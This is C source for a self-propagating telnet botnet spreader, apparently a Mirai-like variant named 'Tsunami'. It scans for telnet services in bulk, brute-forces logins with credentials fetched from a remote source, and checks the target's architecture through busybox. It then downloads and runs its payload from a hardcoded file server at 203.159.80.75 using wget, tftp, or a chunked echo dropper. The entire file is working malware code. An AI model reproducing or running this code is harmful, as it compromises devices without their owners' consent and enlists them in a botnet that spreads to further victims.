static struct dropper *get_retrieve_binary(struct scan_struct *fd)
{
	struct dropper *ptr = &droppers[0];
	int i = 0;

	while(ptr)
	{
		if(i == DROPPER_COUNT)
			break;
		if(fd->bit == ptr->bit && fd->endianness == ptr->endianness && fd->machine == ptr->machine)
			return ptr;
		ptr++;
		i++;
	}

	return NULL;
}

static struct binary *process_retrieve_binary(struct scan_struct *fd, struct dropper *drop)
{
	int i = 0;
	struct binary *b;
	char buf[5] = {0};
	int idx = 0;
	char dst[MAX_ECHO_BYTES * 4];
	int len = 0;
	int pos = 0;

	util_null(dst, 0, MAX_ECHO_BYTES * 4);

	b = (struct binary *)calloc(drop->len / MAX_ECHO_BYTES, sizeof(struct binary));
	for(i = 0; i < drop->len / MAX_ECHO_BYTES; i++)
		b[i].str = (char *)malloc(MAX_ECHO_BYTES * 4);

	retry:
	for(i = 0; i < drop->len; i++)
	{
		if(i == MAX_ECHO_BYTES)
			break;
		util_null(buf, 0, 5);
		sprintf(buf, "\\x%02x", (uint8_t)drop->str[pos + i]);
		util_strcat(dst, buf);
	}

	if(idx == drop->len / MAX_ECHO_BYTES)
		return b;

	len = util_strlen(dst);
	util_memcpy(b[idx].str, dst, len);
	util_null(dst, 0, MAX_ECHO_BYTES * 4);
	idx++;
	pos += i;

	goto retry;
}


void StartTheLelz(void)
{
	int pid = fork();
	struct credentials *auth;
	int i = 0;
	struct scan_struct *fds;
	int max_fds = 1000;
	int ret = 0;
	//struct entry *e;
	char *enable = "enable", *system = "system", *shell = "shell", *sh = "sh", *linuxshell = "linuxshell", *query_string = "/bin/busybox TSUNAMI";
	int err = 0;
	socklen_t err_len = sizeof(err);
	fd_set write_set;
	struct timeval timeout;
	char *file_server = "203.159.80.75";
	char buf[1024] = {0};
	struct dropper *drop;
	struct binary *bin;
	char *dirs[5] = {"/tmp/", "/", "/var/", "/var/run/", "/dev/"}, *arm_bins[2] = {"arm5", "arm@7"};
	int j = 0;

	if(pid > 0 || pid == -1)
	{
		#ifdef DEBUG
		printf("Failed to fork\n");
		#endif	
		return;
	}

	#ifdef DEBUG
	printf("Forked!\n");
	#endif

	#ifdef DEBUG
	printf("Retrieved the file server address\n");
	#endif

	if(!(auth = retrieve_credentials()))
	{
		#ifdef DEBUG
		printf("Failed to remotely retrieve telnet credentials, exiting\n");
		#endif
		exit(1);
	}

	#ifdef DEBUG
	printf("Before initilizing the prompts\n");
	#endif
	init_prompts();
	decode_prompts();
	#ifdef DEBUG
	printf("After initilizing prompts\n");
	#endif

	fds = (struct scan_struct *)calloc(max_fds, sizeof(struct scan_struct));
	if(!fds)
	{
		#ifdef DEBUG
		printf("Failed to allocate enough memory to build the fds struct\n");
		#endif
		exit(1);
	}

	// Reset some values to their default state before scanning
	for(i = 0; i < max_fds; i++)
	{
		fds[i].fd = -1;
		fds[i].state = CONNECTION_SETUP;
		fds[i].credential_index = 0;
		fds[i].timeout = 0;
		fds[i].attempts = 0;
		fds[i].complete = 1;
		fds[i].bit = 0;
		fds[i].endianness = 0;
		fds[i].machine = 0;
		util_null(fds[i].arch, 0, 32);
		fds[i].dropper_index = 0;
		fds[i].upload_method = 0;
	}

	#ifdef DEBUG
	printf("Successfully retrieved telnet credentials!, initilizing scan with %d fds!\n", max_fds);
	#endif

	while(TRUE)
	{
		for(i = 0; i < max_fds; i++)
		{
			if(fds[i].fd != -1 && fds[i].state != CONNECTION_SETUP)
				continue;
			establish_connection(&fds[i]);
		}
		for(i = 0; i < max_fds; i++)
		{
			if(fds[i].fd == -1 || fds[i].state != CONNECTION_SELECT)
				continue;
			// Zero out the FD set
			FD_ZERO(&write_set);
			FD_SET(fds[i].fd, &write_set);

			// Set the select timeout in milliseconds
			timeout.tv_sec = 0;
			timeout.tv_usec = 100;
		
			ret = select(fds[i].fd + 1, NULL, &write_set, NULL, &timeout);
			if(ret == -1)
			{
				reset_state(&fds[i], 1, 0, 0);
				continue;
			}
			// If we get a response deal with it
			if(ret != 0)
			{
				err = 0;
				err_len = sizeof(err);
				getsockopt(fds[i].fd, SOL_SOCKET, SO_ERROR, &err, &err_len);
				if(err != 0)
				{
					reset_state(&fds[i], 1, 0, 0);
					continue;
				}
				//#ifdef DEBUG
				//printf("Established a connection - %d.%d.%d.%d:%d!\n", fds[i].destination_addr & 0xff, (fds[i].destination_addr >> 8) & 0xff, (fds[i].destination_addr >> 16) & 0xff, (fds[i].destination_addr >> 24) & 0xff, ntohs(fds[i].destination_port));
				//#endif
				update_state(&fds[i], TELNET_READ_USER);
				continue;
			}
			check_timeout(&fds[i], 5);
		}
		for(i = 0; i < max_fds; i++)
		{
			// If our fd has not been initilized yet there is no point in attempting to compare states
			if(fds[i].fd == -1)
				continue;
			switch(fds[i].state)
			{
				case TELNET_READ_USER:
				ret = read_response(&fds[i], TELNET_LOGIN_PROMPT);
				if(ret)
				{
					send(fds[i].fd, auth[fds[i].credential_index].str, auth[fds[i].credential_index].len, MSG_NOSIGNAL);
					send(fds[i].fd, "\r\n", 2, MSG_NOSIGNAL);
					//#ifdef DEBUG
					//printf("Trying username \"%s\" - %d.%d.%d.%d:%d\n", auth[fds[i].credential_index].str, fds[i].destination_addr & 0xff, (fds[i].destination_addr >> 8) & 0xff, (fds[i].destination_addr >> 16) & 0xff, (fds[i].destination_addr >> 24) & 0xff, ntohs(fds[i].destination_port));
					//#endif
					fds[i].credential_index++;
					update_state(&fds[i], TELNET_READ_PASSWORD);
					continue;
				}
				check_timeout(&fds[i], 10);
				break;
				case TELNET_READ_PASSWORD:
				ret = read_response(&fds[i], TELNET_LOGIN_PROMPT);
				if(ret)
				{
					send(fds[i].fd, auth[fds[i].credential_index].str, auth[fds[i].credential_index].len, MSG_NOSIGNAL);
					send(fds[i].fd, "\r\n", 2, MSG_NOSIGNAL);
					//#ifdef DEBUG
					//printf("Trying password \"%s\" - %d.%d.%d.%d:%d\n", auth[fds[i].credential_index].str, fds[i].destination_addr & 0xff, (fds[i].destination_addr >> 8) & 0xff, (fds[i].destination_addr >> 16) & 0xff, (fds[i].destination_addr >> 24) & 0xff, ntohs(fds[i].destination_port));
					//#endif
					update_state(&fds[i], TELNET_DETERMINE_SUCCESS);
					continue;
				}
				check_timeout(&fds[i], 10);
				break;
				case TELNET_DETERMINE_SUCCESS:
				ret = read_response(&fds[i], TELNET_SUCCESS_BAD_PROMPT);
				if(ret)
				{
					ret = contains_prompt(&fds[i], TELNET_BAD_PROMPT);
					if(ret)
					{
						//#ifdef DEBUG
						//printf("Failed telnet attempt - %d.%d.%d.%d:%d:%s:%s\n", fds[i].destination_addr & 0xff, (fds[i].destination_addr >> 8) & 0xff, (fds[i].destination_addr >> 16) & 0xff, (fds[i].destination_addr >> 24) & 0xff, ntohs(fds[i].destination_port), auth[fds[i].credential_index - 1].str, auth[fds[i].credential_index].str);
						//#endif
						// Give up
						if((fds[i].attempts + 1) == MAX_TELNET_ATTEMPTS && (fds[i].credential_index + 1) == MAX_TELNET_CREDENTIALS * 2)
						{
							#ifdef DEBUG
							printf("Attempt %d, Credential index %d - %d.%d.%d.%d:%d\n", (fds[i].attempts + 1), fds[i].credential_index, fds[i].destination_addr & 0xff, (fds[i].destination_addr >> 8) & 0xff, (fds[i].destination_addr >> 16) & 0xff, (fds[i].destination_addr >> 24) & 0xff, ntohs(fds[i].destination_port));
							#endif
							reset_state(&fds[i], 1, 0, 0);
							continue;
						}
						fds[i].credential_index++;
						//#ifdef DEBUG
						//printf("Attempt %d, Credential index %d - %d.%d.%d.%d:%d\n", (fds[i].attempts + 1), fds[i].credential_index, fds[i].destination_addr & 0xff, (fds[i].destination_addr >> 8) & 0xff, (fds[i].destination_addr >> 16) & 0xff, (fds[i].destination_addr >> 24) & 0xff, ntohs(fds[i].destination_port));
						//#endif
						fds[i].attempts++;
						reset_state(&fds[i], 0, fds[i].credential_index, fds[i].attempts);
						continue;
					}
					ret = contains_prompt(&fds[i], TELNET_SUCCESS_PROMPT);
					if(ret)
					{
						update_state(&fds[i], TELNET_QUERY);
						continue;
					}
					continue;
				}
				check_timeout(&fds[i], 10);
				break;
				case TELNET_QUERY:
				send(fds[i].fd, enable, 6, MSG_NOSIGNAL);
				send(fds[i].fd, "\r\n", 2, MSG_NOSIGNAL);
				send(fds[i].fd, system, 6, MSG_NOSIGNAL);
				send(fds[i].fd, "\r\n", 2, MSG_NOSIGNAL);
				send(fds[i].fd, shell, 5, MSG_NOSIGNAL);
				send(fds[i].fd, "\r\n", 2, MSG_NOSIGNAL);
				send(fds[i].fd, sh, 2, MSG_NOSIGNAL);
				send(fds[i].fd, "\r\n", 2, MSG_NOSIGNAL);
				send(fds[i].fd, linuxshell, 10, MSG_NOSIGNAL);
				send(fds[i].fd, "\r\n", 2, MSG_NOSIGNAL);
				send(fds[i].fd, query_string, 20, MSG_NOSIGNAL);
				send(fds[i].fd, "\r\n", 2, MSG_NOSIGNAL);
				update_state(&fds[i], TELNET_QUERY_READ);
				break;
				case TELNET_QUERY_READ:
				ret = read_response(&fds[i], TELNET_QUERY_RESPONSE);
				if(ret)
				{
					#ifdef DEBUG
					printf("Success telnet attempt - %d.%d.%d.%d:%d:%s:%s\n", fds[i].destination_addr & 0xff, (fds[i].destination_addr >> 8) & 0xff, (fds[i].destination_addr >> 16) & 0xff, (fds[i].destination_addr >> 24) & 0xff, ntohs(fds[i].destination_port), auth[fds[i].credential_index - 1].str, auth[fds[i].credential_index].str);
					#endif
					// Skip arch checking since we've already done it
					if(fds[i].complete > 1)
					{
						update_state(&fds[i], TELNET_CHOOSE_DIR);
						continue;
					}
					send(fds[i].fd, "/bin/busybox cat /bin/busybox\r\n", 31, MSG_NOSIGNAL);
					update_state(&fds[i], TELNET_GET_ARCH);
					continue;
				}
				check_timeout(&fds[i], 10);
				break;
				// Bindly attempt to write to a directory then make writeable files for later use
				case TELNET_CHOOSE_DIR:
				for(j = 0; j < 5; j++)
				{
					util_null(buf, 0, 1024);
					util_strcat(buf, ">");
					util_strcat(buf, dirs[j]);
					util_strcat(buf, "t && cd ");
					util_strcat(buf, dirs[j]);
					util_strcat(buf, " && >retrieve; >.t");
					send(fds[i].fd, buf, util_strlen(buf), MSG_NOSIGNAL);
					send(fds[i].fd, "\r\n", 2, MSG_NOSIGNAL);
				}
				send(fds[i].fd, "/bin/busybox cp /bin/busybox retrieve && >retrieve && /bin/busybox chmod 777 retrieve && /bin/busybox cp /bin/busybox .t && >.t && /bin/busybox chmod 777 .t\r\n", 158, MSG_NOSIGNAL);
				if(fds[i].complete == 3)
				{
					update_state(&fds[i], TELNET_BUILD_ECHO_PAYLOAD);
					continue;
				}
				send(fds[i].fd, "/bin/busybox KSLAKW; /bin/busybox wget; /bin/busybox tftp; /bin/busybox echo\r\n", 78, MSG_NOSIGNAL);
				update_state(&fds[i], TELNET_CHOOSE_METHOD);
				break;
				case TELNET_GET_ARCH:
				ret = read_response(&fds[i], TELNET_ELF_RESPONSE);
				if(ret)
				{
					ret = parse_elf_response(&fds[i]);
					if(!ret)
					{
						#ifdef DEBUG
						printf("Failed to parse the ELF response - %d.%d.%d.%d:%d:%s:%s\n", fds[i].destination_addr & 0xff, (fds[i].destination_addr >> 8) & 0xff, (fds[i].destination_addr >> 16) & 0xff, (fds[i].destination_addr >> 24) & 0xff, ntohs(fds[i].destination_port), auth[fds[i].credential_index - 1].str, auth[fds[i].credential_index].str);
						#endif
						reset_state(&fds[i], 1, 0, 0);
						continue;
					}
					#ifdef DEBUG
					printf("Successfully parsed the ELF response - %d.%d.%d.%d:%d %d:%d:%d %s\n", fds[i].destination_addr & 0xff, (fds[i].destination_addr >> 8) & 0xff, (fds[i].destination_addr >> 16) & 0xff, (fds[i].destination_addr >> 24) & 0xff, ntohs(fds[i].destination_port), fds[i].bit, fds[i].endianness, fds[i].machine, fds[i].arch);
					#endif
					// We need to reset because our session would be spammed with junk ELF data
					reset_state(&fds[i], 2, 0, 0);
					continue;
				}
				check_timeout(&fds[i], 10);
				break;
				case TELNET_CHOOSE_METHOD:
				ret = read_response(&fds[i], TELNET_QUERY_RESPONSE);
				if(ret)
				{
					ret = contains_prompt(&fds[i], TELNET_WGET_RESPONSE);
					if(!ret)
					{
						#ifdef DEBUG
						printf("Chose wget as our transfer method - %d.%d.%d.%d:%d:%s:%s\n", fds[i].destination_addr & 0xff, (fds[i].destination_addr >> 8) & 0xff, (fds[i].destination_addr >> 16) & 0xff, (fds[i].destination_addr >> 24) & 0xff, ntohs(fds[i].destination_port), auth[fds[i].credential_index - 1].str, auth[fds[i].credential_index].str);
						#endif
						fds[i].upload_method = 1;
						if(fds[i].machine != EM_ARM)
						{
							util_null(buf, 0, 1024);
							util_strcpy(buf, "/bin/busybox wget http://");
							util_strcat(buf, file_server);
							util_strcat(buf, "/");
							util_strcat(buf, fds[i].arch);
							util_strcat(buf, " -O -> .t; /bin/busybox chmod 777 .t; ./.t");
							send(fds[i].fd, buf, util_strlen(buf), MSG_NOSIGNAL);
							send(fds[i].fd, "\r\n", 2, MSG_NOSIGNAL);
							update_state(&fds[i], TELNET_READ_DEPLOY);
							continue;
						}
						for(j = 0; j < 2; j++)
						{
							util_null(buf, 0, 1024);
							util_strcpy(buf, "/bin/busybox wget http://");
							util_strcat(buf, file_server);
							util_strcat(buf, "/");
							util_strcat(buf, arm_bins[j]);
							util_strcat(buf, " -O -> .t; /bin/busybox chmod 777 .t; ./.t");
							send(fds[i].fd, buf, util_strlen(buf), MSG_NOSIGNAL);
							send(fds[i].fd, "\r\n", 2, MSG_NOSIGNAL);
						}
						update_state(&fds[i], TELNET_READ_DEPLOY);
						continue;
					}
					ret = contains_prompt(&fds[i], TELNET_TFTP_RESPONSE);
					if(!ret)
					{
						#ifdef DEBUG
						printf("Chose tftp as our transfer method - %d.%d.%d.%d:%d:%s:%s\n", fds[i].destination_addr & 0xff, (fds[i].destination_addr >> 8) & 0xff, (fds[i].destination_addr >> 16) & 0xff, (fds[i].destination_addr >> 24) & 0xff, ntohs(fds[i].destination_port), auth[fds[i].credential_index - 1].str, auth[fds[i].credential_index].str);
						#endif
						fds[i].upload_method = 2;
						if(fds[i].machine != EM_ARM)
						{
							util_null(buf, 0, 1024);
							util_strcpy(buf, "/bin/busybox tftp -r ");
							util_strcat(buf, fds[i].arch);
							util_strcat(buf, " -l .t -g ");
							util_strcat(buf, file_server);
							util_strcat(buf, "; /bin/busybox chmod 777 .t; ./.t");
							send(fds[i].fd, buf, util_strlen(buf), MSG_NOSIGNAL);
							send(fds[i].fd, "\r\n", 2, MSG_NOSIGNAL);
							update_state(&fds[i], TELNET_READ_DEPLOY);
							continue;
						}
						for(j = 0; j < 2; j++)
						{
							util_null(buf, 0, 1024);
							util_strcpy(buf, "/bin/busybox tftp -r ");
							util_strcat(buf, arm_bins[j]);
							util_strcat(buf, " -l .t -g ");
							util_strcat(buf, file_server);
							util_strcat(buf, "; /bin/busybox chmod 777 .t; ./.t");
							send(fds[i].fd, buf, util_strlen(buf), MSG_NOSIGNAL);
							send(fds[i].fd, "\r\n", 2, MSG_NOSIGNAL);
						}
						update_state(&fds[i], TELNET_READ_DEPLOY);
						continue;	
					}
					fds[i].upload_method = 0;
					#ifdef DEBUG
					printf("Chose echo as our transfer method - %d.%d.%d.%d:%d:%s:%s\n", fds[i].destination_addr & 0xff, (fds[i].destination_addr >> 8) & 0xff, (fds[i].destination_addr >> 16) & 0xff, (fds[i].destination_addr >> 24) & 0xff, ntohs(fds[i].destination_port), auth[fds[i].credential_index - 1].str, auth[fds[i].credential_index].str);
					#endif
					//reset_state(&fds[i], 1, 0, 0);
					update_state(&fds[i], TELNET_BUILD_ECHO_PAYLOAD);
					continue;
				}
				check_timeout(&fds[i], 10);
				break;
				case TELNET_BUILD_ECHO_PAYLOAD:
				drop = get_retrieve_binary(&fds[i]);
				if(!drop)
				{
					#ifdef DEBUG
					printf("Failed to retrieve a binary - %d.%d.%d.%d:%d:%s:%s\n", fds[i].destination_addr & 0xff, (fds[i].destination_addr >> 8) & 0xff, (fds[i].destination_addr >> 16) & 0xff, (fds[i].destination_addr >> 24) & 0xff, ntohs(fds[i].destination_port), auth[fds[i].credential_index - 1].str, auth[fds[i].credential_index].str);
					#endif
					reset_state(&fds[i], 1, 0, 0);
					continue;
				}
				bin = process_retrieve_binary(&fds[i], drop);
				if(!bin)
				{
					#ifdef DEBUG
					printf("Failed to process binary - %d.%d.%d.%d:%d:%s:%s\n", fds[i].destination_addr & 0xff, (fds[i].destination_addr >> 8) & 0xff, (fds[i].destination_addr >> 16) & 0xff, (fds[i].destination_addr >> 24) & 0xff, ntohs(fds[i].destination_port), auth[fds[i].credential_index - 1].str, auth[fds[i].credential_index].str);
					#endif
					free(bin);
					reset_state(&fds[i], 1, 0, 0);
					continue;	
				}
				#ifdef DEBUG
				printf("Retrieved & processed binary! - %d.%d.%d.%d:%d:%s:%s\n", fds[i].destination_addr & 0xff, (fds[i].destination_addr >> 8) & 0xff, (fds[i].destination_addr >> 16) & 0xff, (fds[i].destination_addr >> 24) & 0xff, ntohs(fds[i].destination_port), auth[fds[i].credential_index - 1].str, auth[fds[i].credential_index].str);
				#endif
				util_null(buf, 0, 1024);
				util_strcpy(buf, "/bin/busybox echo -en '");
				util_strcat(buf, bin[fds[i].dropper_index].str);
				util_strcat(buf, "' ");
				util_strcat(buf, fds[i].dropper_index == 0 ? ">" : ">>");
				util_strcat(buf, " retrieve && /bin/busybox echo -en '\\x45\\x43\\x48\\x4f\\x44\\x4f\\x4e\\x45'");
				send(fds[i].fd, buf, util_strlen(buf), MSG_NOSIGNAL);
				send(fds[i].fd, "\r\n", 2, MSG_NOSIGNAL);
				free(bin);
				#ifdef DEBUG
				//printf("Built echo payload - %d.%d.%d.%d:%d:%s:%s - \"%s\"\n", fds[i].destination_addr & 0xff, (fds[i].destination_addr >> 8) & 0xff, (fds[i].destination_addr >> 16) & 0xff, (fds[i].destination_addr >> 24) & 0xff, ntohs(fds[i].destination_port), auth[fds[i].credential_index - 1].str, auth[fds[i].credential_index].str, buf);
				#endif
				if((fds[i].dropper_index + 1) == drop->len / MAX_ECHO_BYTES)
				{
					#ifdef DEBUG
					printf("Successfully transfered the binary to the host - %d.%d.%d.%d:%d:%s:%s\n", fds[i].destination_addr & 0xff, (fds[i].destination_addr >> 8) & 0xff, (fds[i].destination_addr >> 16) & 0xff, (fds[i].destination_addr >> 24) & 0xff, ntohs(fds[i].destination_port), auth[fds[i].credential_index - 1].str, auth[fds[i].credential_index].str);
					#endif
					send(fds[i].fd, "./retrieve > .t && ./.t; >retrieve && >.t\r\n", 43, MSG_NOSIGNAL);
					update_state(&fds[i], TELNET_READ_DEPLOY);
					continue;
				}
				fds[i].dropper_index++;
				update_state(&fds[i], TELNET_ECHO_READ);
				break;
				case TELNET_ECHO_READ:
				ret = read_response(&fds[i], TELNET_ECHO_RESPONSE);
				if(ret)
				{
					update_state(&fds[i], TELNET_BUILD_ECHO_PAYLOAD);
					continue;
				}
				check_timeout(&fds[i], 10);
				break;
				case TELNET_READ_DEPLOY:
				ret = read_response(&fds[i], TELNET_DEPLOY_RESPONSE);
				if(ret)
				{
					#ifdef DEBUG
					printf("Tsunami successfully deployed! - %d.%d.%d.%d:%d:%s:%s\n", fds[i].destination_addr & 0xff, (fds[i].destination_addr >> 8) & 0xff, (fds[i].destination_addr >> 16) & 0xff, (fds[i].destination_addr >> 24) & 0xff, ntohs(fds[i].destination_port), auth[fds[i].credential_index - 1].str, auth[fds[i].credential_index].str);
					#endif
					reset_state(&fds[i], 1, 0, 0);
					continue;
				}
				check_timeout(&fds[i], 30);
				break;
				// If we got here and failed to match any current states just break out of the switch
				default:
				break;
			}
		}
	}
}

void kill_scan(void)
{
	if(scan_pid != -1)
		kill(scan_pid, 9);
}
